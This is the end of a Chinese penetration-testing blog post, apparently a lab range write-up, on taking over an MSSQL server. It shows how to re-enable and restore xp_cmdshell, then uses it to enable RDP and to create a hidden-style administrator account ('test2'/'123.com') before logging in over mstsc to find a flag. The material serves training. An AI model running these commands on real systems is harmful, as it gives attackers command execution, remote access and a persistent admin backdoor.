+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重新开启它。<br><br>启用：<br>EXEC sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span><br>RECONFIGURE;<br>EXEC sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span>;<br>RECONFIGURE;<br><br>关闭：<br><span class="hljs-built_in">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;<br>reconfigure;<br><span class="hljs-built_in">exec</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">0</span>;<br>reconfigure;<br><br>执行：<br>EXEC master.dbo.xp_cmdshell <span class="hljs-string">&#x27;命令&#x27;</span><br><br>如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复<br><span class="hljs-built_in">exec</span> master.sys.sp_addextendedproc <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-string">&#x27;C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll&#x27;</span><br><br></code></pre></td></tr></table></figure>
+<p>关闭防火墙<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670066773730-7b4ba63c-9b19-40a7-97e2-a62d1592a436.png#averageHue=%23fbfbfa&clientId=uc97bafc7-c7fa-4&from=paste&height=599&id=ucabf6d6e&originHeight=599&originWidth=1082&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28291&status=done&style=none&taskId=u630846c9-ae20-43b7-8f97-508990d5527&title=&width=1082" alt="image.png"><br><a name="cXLQN"></a></p>
+<h2><span id="开启rdp-远程连接">开启RDP 远程连接</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">exec</span> master.dbo.xp_cmdshell <span class="hljs-string">&#x27;reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v &quot;fDenyTSconnections&quot; /t REG_DWORD /d 0 /f&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><a name="QiH1j"></a></p>
+<h2><span id="创建用户-添加到管理员组">创建用户 + 添加到管理员组</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">exec</span> master..xp_cmdshell <span class="hljs-string">&#x27;net user test2 123.com /add&#x27;</span><br><span class="hljs-built_in">exec</span> master..xp_cmdshell <span class="hljs-string">&#x27;net localgroup administrators test2 /add&#x27;</span><br><span class="hljs-built_in">exec</span> master..xp_cmdshell <span class="hljs-string">&#x27;net user test2&#x27;</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670067176612-3883341b-444f-4a29-87aa-cab05a396503.png#averageHue=%23fbfafa&clientId=uc97bafc7-c7fa-4&from=paste&height=593&id=uefaa996e&originHeight=593&originWidth=1028&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34504&status=done&style=none&taskId=uc5de12fa-7795-4ccf-a0a7-76cbfdc8826&title=&width=1028" alt="image.png"></p>
+<p><a name="verLN"></a></p>
+<h1><span id="mstsc-远程连接">mstsc 远程连接</span></h1><p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670067222492-ef8d18c5-fbb2-4502-843c-190e64a51075.png#averageHue=%23626c73&clientId=uc97bafc7-c7fa-4&from=paste&height=767&id=u210f4fbe&originHeight=767&originWidth=1344&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56790&status=done&style=none&taskId=u03d640ec-40d6-4ba2-b648-18bcbc07563&title=&width=1344" alt="image.png"></p>
+<p>这里找到key3 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670067337214-52e94b96-d146-4152-9c54-ebe3e1472f30.png#averageHue=%23f6f6f6&clientId=uc97bafc7-c7fa-4&from=paste&height=930&id=u8d78bb3a&originHeight=930&originWidth=1597&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69629&status=done&style=none&taskId=u9d3c215e-ea49-4391-9392-75278c6e105&title=&width=1597" alt="image.png"><br>其实和数据库里面的key3 一样的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1670067360003-a707eed2-17d4-4984-a8fd-4c1c85c2b583.png#averageHue=%23f9f8f8&clientId=uc97bafc7-c7fa-4&from=paste&height=505&id=u4e00e2eb&originHeight=505&originWidth=1014&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44805&status=done&style=none&taskId=u5388df6b-72da-4985-af8e-daed64e8db1&title=&width=1014" alt="image.png"></p>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/03/19/DC%20-9/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>DC-9</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <div class="post-nav-item-right"></div>
+  
+</div>
+
+    
+      <div class="related-post">
+  <div class="related__head">
+  <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-tag">#渗透测试</a><a href="/tags/PTE%E9%9D%B6%E5%9C%BA/" class="post-tag">#PTE靶场</a>
+
+</div>
+  <div class="realated__body">
+    
+      DEBUG: 请安装插件 <a target="_blank" rel="noopener" href="https://github.com/tea3/hexo-related-popular-posts">hexo-related-popular-posts</a> 或关闭 related_post 配置!
+    
+  </div>
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              
+                <div class="matts">浮</div>
+              
+                <div class="matts">云</div>
+              
+                <div class="matts">游</div>
+              
+                <div class="matts">子</div>
+              
+                <div class="matts">意</div>
+              
+            </div>
+          
+            <div class="foot-line">
+              
+                <div class="matts">落</div>
+              
+                <div class="matts">日</div>
+              
+                <div class="matts">故</div>
+              
+                <div class="matts">人</div>
+              
+                <div class="matts">情</div>
+              
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/x0blank">github</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link" height="20px" width="20px" src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:chenxiaolong592@gmail.com">chenxiaolong592@gmail.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="http://example.com">Blanks'Blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)" d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z"/>
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)" d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z"/>
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)" d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z"/>
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+    
+  
+
+  </body>
+</html>
